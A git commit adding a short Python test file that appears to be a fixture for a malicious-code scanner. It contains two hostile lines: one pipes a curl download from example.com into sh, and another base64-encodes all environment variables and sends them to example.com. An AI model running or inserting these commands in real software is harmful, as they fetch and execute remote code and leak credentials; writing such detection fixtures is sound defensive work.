a0d173526e896f146dd9978da8e349f4b55fe93e
Artem Golubin <me@rushter.com>
2025-09-07 12:43:59 +0400

    test: add new test file

---
+++ resources/test/exec_06.py
@@ -0,0 +1,10 @@
+import os
+import subprocess
+
+subprocess.run(["/bin/bash", "-c", "curl http://example.com/favicon.txt|sh"])
+
+try:
+    os.system("curl https://example.com/X/$(env | base64 -w 0)")
+except Exception as e:
+    print(e)
+
